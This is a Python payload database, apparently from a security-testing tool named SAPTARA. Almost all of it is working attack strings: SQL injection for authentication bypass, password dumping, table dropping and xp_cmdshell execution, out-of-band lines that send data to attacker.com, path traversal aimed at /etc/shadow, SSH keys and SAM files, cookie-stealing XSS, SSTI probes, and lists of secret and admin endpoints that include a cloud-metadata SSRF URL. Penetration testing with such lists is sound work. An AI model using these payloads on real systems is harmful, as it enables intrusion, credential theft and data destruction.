"""
Production payload database for SAPTARA security testing.
Covers: SQLi, XSS, Path Traversal, Auth Bypass, Bot Detection,
        API Enumeration — with encoding variants and WAF bypass techniques.
"""

from typing import List, Tuple


class PayloadDatabase:

    # ------------------------------------------------------------------
    # SQL Injection
    # ------------------------------------------------------------------

    def get_sql_injection_payloads(self) -> List[str]:
        return [
            # ── Classic auth bypass ──────────────────────────────────
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "') OR ('1'='1", "')) OR (('1'='1",
            "admin'--", "admin'#", "admin'/*",
            "' OR 'x'='x", "\" OR \"x\"=\"x",
            "1' OR '1'='1'--", "1 OR 1=1",
            "' OR 1-- -", "') OR 1-- -",

            # ── Union-based ──────────────────────────────────────────
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
            "' UNION SELECT 1,2,3,4--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT NULL--",
            "' UNION ALL SELECT 1,2,3--",
            "' UNION SELECT user(),version(),database()--",
            "' UNION SELECT @@version,NULL,NULL--",
            "' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' UNION SELECT column_name,NULL FROM information_schema.columns--",
            "' UNION SELECT username,password FROM users--",
            "' UNION SELECT load_file('/etc/passwd'),NULL--",
            "1 UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",

            # ── Error-based ──────────────────────────────────────────
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
            "' OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
            "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            # PostgreSQL error-based
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM pg_catalog.pg_tables GROUP BY x)a)--",
            # MSSQL error-based
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "'; SELECT 1/0--",

            # ── Time-based blind ─────────────────────────────────────
            "'; WAITFOR DELAY '0:0:5'--",
            "'; WAITFOR DELAY '0:0:5'--; --",
            "'; SELECT SLEEP(5)--",
            "' AND SLEEP(5)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "' OR SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--",
            "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
            "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",
            "' AND BENCHMARK(5000000,MD5('test'))--",
            "' OR BENCHMARK(5000000,SHA1('test'))--",

            # ── Boolean-based blind ──────────────────────────────────
            "' AND 1=1--", "' AND 1=2--",
            "' AND 'a'='a", "' AND 'a'='b",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND SUBSTRING(@@version,1,1)='8'--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>5--",
            "1 AND 1=1", "1 AND 1=2",

            # ── Stacked queries ──────────────────────────────────────
            "'; INSERT INTO users(username,password) VALUES('hax','hax')--",
            "'; UPDATE users SET password='hacked' WHERE '1'='1'--",
            "'; DROP TABLE users--",
            "'; CREATE TABLE pwned(id int)--",
            "'; EXEC xp_cmdshell('whoami')--",
            "'; EXEC sp_configure 'show advanced options',1--",

            # ── WAF bypass — comment variations ──────────────────────
            "'/**/OR/**/1=1--",
            "' /*!OR*/ 1=1--",
            "'%09OR%091=1--",
            "' OR%091=1--",
            "'%0aOR%0a1=1--",
            "' OR 1=1-- -",
            "' OR 1=1;--",
            "'||1=1--",
            "' oR '1'='1",
            "' Or 1=1--",

            # ── URL/hex encoded ──────────────────────────────────────
            "%27 OR %271%27=%271",
            "%27 OR 1=1--",
            "' OR 0x313d31--",
            "' OR CHAR(49)=CHAR(49)--",
            "' OR 0x61646d696e'='0x61646d696e",

            # ── Second-order / out-of-band ────────────────────────────
            "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\')))--",
            "'; EXEC master..xp_dirtree '//attacker.com/a'--",

            # ── NoSQL injection ──────────────────────────────────────
            "[$ne]=1", "[$gt]=", "[$regex]=.*",
            "[$where]=1==1", "[$exists]=true",
            "'; return true; var x='",
            "'; return 1==1; var x='",
            "{\"$gt\": \"\"}",
            "{\"$ne\": null}",
            "{\"$regex\": \".*\"}",
            "{\"$where\": \"1==1\"}",

            # ── GraphQL injection ─────────────────────────────────────
            "{ __schema { types { name } } }",
            "{ user(id: \"1 OR 1=1\") { id username } }",
        ]

    # ------------------------------------------------------------------
    # Path Traversal
    # ------------------------------------------------------------------

    def get_path_traversal_payloads(self) -> List[str]:
        return [
            # ── Basic Unix ───────────────────────────────────────────
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../etc/shadow",
            "../../../etc/hosts",
            "../../../etc/hostname",
            "../../../etc/issue",
            "../../../proc/self/environ",
            "../../../proc/version",
            "../../../proc/cmdline",
            "../../../proc/self/cmdline",
            "../../../proc/self/status",
            "../../../var/log/apache2/access.log",
            "../../../var/log/nginx/access.log",
            "../../../var/log/auth.log",
            "../../../home/user/.ssh/id_rsa",
            "../../../root/.ssh/id_rsa",
            "../../../root/.bash_history",

            # ── Basic Windows ────────────────────────────────────────
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\boot.ini",
            "..\\..\\..\\windows\\system32\\config\\system",
            "C:\\windows\\win.ini",
            "C:\\boot.ini",

            # ── URL encoded ──────────────────────────────────────────
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",

            # ── Double URL encoded ───────────────────────────────────
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "%252e%252e/%252e%252e/%252e%252e/etc/passwd",

            # ── Unicode / UTF-8 encoded ──────────────────────────────
            "..%u2216..%u2216..%u2216etc%u2216passwd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
            "\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd",

            # ── Null byte injection ──────────────────────────────────
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            "../../../etc/passwd%00.png",
            "../../../etc/passwd\x00",
            "..\\..\\..\\windows\\win.ini%00",

            # ── Filter bypass — dot variations ───────────────────────
            "....//....//....//etc//passwd",
            "....\\\\....\\\\....\\\\windows\\\\win.ini",
            "..//////..//////..//////etc//////passwd",
            ".././.././.././etc/passwd",
            "..%5c..%5c..%5cetc%5cpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",

            # ── Absolute paths ───────────────────────────────────────
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/proc/self/environ",
            "\\windows\\win.ini",

            # ── Archive / zip slip ───────────────────────────────────
            "../../evil.sh",
            "../../../tmp/evil",
        ]

    # ------------------------------------------------------------------
    # XSS
    # ------------------------------------------------------------------

    def get_xss_payloads(self) -> List[str]:
        return [
            # ── Basic script tags ────────────────────────────────────
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(document.domain)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<Script>alert(1)</Script>",

            # ── Image / onerror ──────────────────────────────────────
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<img src=1 onerror=alert(document.cookie)>",
            "<img/src=x onerror=alert(1)>",
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",

            # ── SVG ──────────────────────────────────────────────────
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg onload=\"alert(1)\">",
            "<svg><script>alert(1)</script></svg>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<svg><set onbegin=alert(1) attributeName=x>",

            # ── Event handlers ───────────────────────────────────────
            "<body onload=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<video autoplay onloadstart=alert(1)><source>",
            "<audio autoplay onloadstart=alert(1)><source>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "\" onmouseover=\"alert(1)\"",
            "' onmouseover='alert(1)'",
            "\" onfocus=\"alert(1)\" autofocus=\"",

            # ── JavaScript protocol ──────────────────────────────────
            "javascript:alert(1)",
            "javascript:alert(document.cookie)",
            "javascript:confirm(1)",
            "javascript:prompt(1)",
            "JAVASCRIPT:alert(1)",
            "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)",
            "java&#115;cript:alert(1)",
            "java\tscript:alert(1)",
            "java\nscript:alert(1)",

            # ── Data URI ─────────────────────────────────────────────
            "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
            "<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
            "<object data=\"data:text/html,<script>alert(1)</script>\">",

            # ── Filter bypass — case / encoding ──────────────────────
            "<ScRiPt>alert(1)</ScRiPt>",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "</script><script>alert(1)</script>",
            "<img src=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">",

            # ── Template injection / SSTI ─────────────────────────────
            "{{7*7}}", "${7*7}", "#{7*7}",
            "{{config}}", "{{self.__dict__}}",
            "<%= 7*7 %>", "${7*7}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",

            # ── DOM-based ────────────────────────────────────────────
            "#<script>alert(1)</script>",
            "?q=<script>alert(1)</script>",
            "<a href=\"javascript:alert(1)\">click</a>",

            # ── Polyglots ────────────────────────────────────────────
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "\"><img src=x onerror=alert(1)>",
            "';alert(1)//",
            "\";alert(1)//",
        ]

    # ------------------------------------------------------------------
    # Malicious User Agents
    # ------------------------------------------------------------------

    def get_malicious_user_agents(self) -> List[str]:
        return [
            # Injection tools
            "sqlmap/1.0", "sqlmap/1.4.12#dev", "sqlninja/0.2.6-r1",
            "Havij", "pangolin/",
            # Web scanners
            "nikto/2.1.6", "Nikto/2.1.5",
            "w3af.org", "w3af/1.6",
            "OWASP ZAP/2.11.0",
            "Burp Suite Professional",
            "Acunetix Web Vulnerability Scanner/14",
            "Netsparker",
            "AppScan",
            "WebInspect",
            # Network scanners
            "Nmap Scripting Engine",
            "masscan/1.0",
            "zgrab/0.x",
            # Exploit frameworks
            "Metasploit", "msfconsole",
            # Vulnerability scanners
            "Nessus", "OpenVAS", "Qualys",
            # Headless browsers used in attacks
            "HeadlessChrome", "PhantomJS/2.1",
            # Generic automation
            "python-requests/2.28.0",
            "python-urllib/3.10",
            "Go-http-client/1.1",
            "Java/1.8.0",
            "libwww-perl/6.52",
            "curl/7.68.0",
            "Wget/1.20.3",
            "axios/0.21.1",
            # Scrapers / crawlers
            "scrapy/2.5.0",
            "HTTrack",
            "WebCopier",
            "SiteSnagger",
            # Empty / blank UA
            "",
            "-",
        ]

    # ------------------------------------------------------------------
    # Injectable endpoints
    # ------------------------------------------------------------------

    def get_injectable_endpoints(self) -> List[Tuple[str, str, List[str]]]:
        """(endpoint, field_name, [http_methods])"""
        return [
            # Auth
            ("/api/auth/login/",        "username",   ["GET", "POST"]),
            ("/api/auth/login/",        "password",   ["POST"]),
            ("/api/auth/login/",        "email",      ["POST"]),
            ("/api/auth/register/",     "username",   ["POST"]),
            ("/api/auth/register/",     "email",      ["POST"]),
            ("/api/auth/token/",        "username",   ["POST"]),
            ("/api/token/",             "username",   ["POST"]),
            ("/login",                  "username",   ["GET", "POST"]),
            ("/login",                  "password",   ["POST"]),
            ("/signin",                 "username",   ["POST"]),
            # User management
            ("/api/users/",             "id",         ["GET"]),
            ("/api/users/",             "username",   ["GET"]),
            ("/api/users/",             "email",      ["GET"]),
            ("/api/users/search/",      "q",          ["GET"]),
            ("/api/profile/",           "id",         ["GET"]),
            # Search
            ("/api/search/",            "q",          ["GET"]),
            ("/api/search/",            "query",      ["GET"]),
            ("/api/search/",            "keyword",    ["GET"]),
            ("/search",                 "q",          ["GET"]),
            ("/search",                 "s",          ["GET"]),
            # Products / items
            ("/api/products/",          "id",         ["GET"]),
            ("/api/products/",          "category",   ["GET"]),
            ("/api/products/",          "name",       ["GET"]),
            ("/api/items/",             "id",         ["GET"]),
            ("/api/items/",             "filter",     ["GET"]),
            # Orders / transactions
            ("/api/orders/",            "id",         ["GET"]),
            ("/api/orders/",            "user_id",    ["GET"]),
            ("/api/transactions/",      "id",         ["GET"]),
            # Content
            ("/api/posts/",             "id",         ["GET"]),
            ("/api/posts/",             "author",     ["GET"]),
            ("/api/comments/",          "post_id",    ["GET"]),
            ("/api/comments/",          "id",         ["GET"]),
            ("/api/articles/",          "id",         ["GET"]),
            # File operations
            ("/api/files/",             "filename",   ["GET"]),
            ("/api/files/",             "path",       ["GET"]),
            ("/api/download/",          "file",       ["GET"]),
            ("/api/download/",          "path",       ["GET"]),
            ("/api/export/",            "format",     ["GET"]),
            ("/api/report/",            "id",         ["GET"]),
            # Misc
            ("/api/notifications/",     "user_id",    ["GET"]),
            ("/api/messages/",          "to",         ["GET"]),
            ("/api/settings/",          "key",        ["GET"]),
        ]

    # ------------------------------------------------------------------
    # Sensitive endpoints for enumeration
    # ------------------------------------------------------------------

    def get_sensitive_endpoints(self) -> List[str]:
        return [
            # ── Environment & secrets ────────────────────────────────
            "/.env", "/.env.local", "/.env.dev", "/.env.development",
            "/.env.staging", "/.env.production", "/.env.prod",
            "/.env.backup", "/.env.bak", "/.env.old", "/.env.save",
            "/.env.example", "/.env.sample",
            "/config.json", "/config.yml", "/config.yaml",
            "/config.php", "/config.rb", "/config.py",
            "/configuration.json", "/configuration.yml",
            "/app.config", "/web.config", "/appsettings.json",
            "/settings.py", "/settings.json", "/local_settings.py",
            "/secrets.json", "/secrets.yml", "/credentials.json",
            "/database.yml", "/database.json",
            "/application.properties", "/application.yml",

            # ── Source control ───────────────────────────────────────
            "/.git/config", "/.git/HEAD", "/.git/index",
            "/.git/COMMIT_EDITMSG", "/.git/packed-refs",
            "/.git/refs/heads/main", "/.git/refs/heads/master",
            "/.gitignore", "/.gitmodules",
            "/.svn/entries", "/.svn/wc.db",
            "/.hg/hgrc", "/.hg/store/00manifest.i",
            "/.bzr/branch/branch.conf",
            "/CVS/Root", "/CVS/Entries",

            # ── Backups & dumps ──────────────────────────────────────
            "/backup.sql", "/backup.tar.gz", "/backup.zip",
            "/backup.tar", "/backup.tgz", "/backup.gz",
            "/db.sql", "/dump.sql", "/database.sql",
            "/data.sql", "/export.sql", "/mysql.sql",
            "/site.tar.gz", "/www.tar.gz", "/html.tar.gz",
            "/backup/", "/backups/", "/old/", "/archive/",
            "/db_backup.sql", "/full_backup.zip",

            # ── Admin & management ───────────────────────────────────
            "/admin/", "/admin/login/", "/admin/dashboard/",
            "/administrator/", "/administrator/index.php",
            "/wp-admin/", "/wp-login.php", "/wp-config.php",
            "/api/admin/", "/api/admin/users/", "/api/admin/config/",
            "/api/v1/admin/", "/api/v2/admin/",
            "/manage/", "/management/", "/panel/", "/cpanel/",
            "/phpmyadmin/", "/pma/", "/myadmin/",
            "/adminer.php", "/adminer/",

            # ── Debug & development ──────────────────────────────────
            "/api/debug/", "/debug/", "/api/test/", "/test/",
            "/api/internal/", "/api/private/", "/api/dev/",
            "/console/", "/rails/info/", "/rails/info/properties",
            "/__debug__/", "/debug/default/view",
            "/api/graphql", "/graphql", "/graphiql",
            "/api/playground",

            # ── Framework-specific ───────────────────────────────────
            # Spring Boot Actuator
            "/actuator", "/actuator/env", "/actuator/health",
            "/actuator/beans", "/actuator/mappings",
            "/actuator/metrics", "/actuator/info",
            "/actuator/loggers", "/actuator/heapdump",
            "/actuator/threaddump", "/actuator/httptrace",
            "/actuator/auditevents", "/actuator/conditions",
            "/actuator/configprops", "/actuator/scheduledtasks",
            "/actuator/sessions", "/actuator/shutdown",
            # Laravel
            "/telescope/requests", "/telescope/queries",
            "/telescope/exceptions", "/telescope/logs",
            "/horizon/", "/_ignition/health-check",
            "/_ignition/execute-solution",
            # Django
            "/__debug__/", "/django-admin/",
            # Rails
            "/rails/info/properties", "/rails/info/routes",
            # Node
            "/.well-known/", "/node_modules/",
            # PHP
            "/phpinfo.php", "/info.php", "/test.php",
            "/php.php", "/phptest.php", "/i.php",
            # Symfony
            "/app_dev.php", "/app_dev.php/_profiler",
            "/_profiler/", "/_wdt/",

            # ── API documentation ────────────────────────────────────
            "/docs", "/docs/", "/swagger", "/swagger/",
            "/swagger-ui.html", "/swagger-ui/",
            "/api-docs", "/api-docs/",
            "/openapi.json", "/openapi.yaml",
            "/v1/docs", "/v2/docs", "/v3/docs",
            "/redoc", "/redoc/",

            # ── Logs & monitoring ────────────────────────────────────
            "/logs/", "/log/", "/logging/",
            "/log/app.log", "/log/error.log",
            "/storage/logs/laravel.log",
            "/var/log/nginx/error.log",
            "/var/log/apache2/error.log",
            "/server-status", "/server-info",
            "/nginx_status", "/fpm-status",

            # ── Cloud metadata (SSRF) ────────────────────────────────
            "/api/fetch/?url=http://169.254.169.254/latest/meta-data/",
            "/api/proxy/?url=http://169.254.169.254/latest/meta-data/",
            "/api/request/?url=http://169.254.169.254/",

            # ── Common sensitive files ───────────────────────────────
            "/robots.txt", "/sitemap.xml",
            "/.htaccess", "/.htpasswd",
            "/crossdomain.xml", "/clientaccesspolicy.xml",
            "/security.txt", "/.well-known/security.txt",
            "/package.json", "/package-lock.json",
            "/composer.json", "/composer.lock",
            "/Gemfile", "/Gemfile.lock",
            "/requirements.txt", "/Pipfile",
            "/Dockerfile", "/docker-compose.yml",
            "/Makefile", "/.travis.yml",
            "/.github/workflows/",
            "/yarn.lock", "/pom.xml",
            "/build.gradle", "/build.xml",
        ]
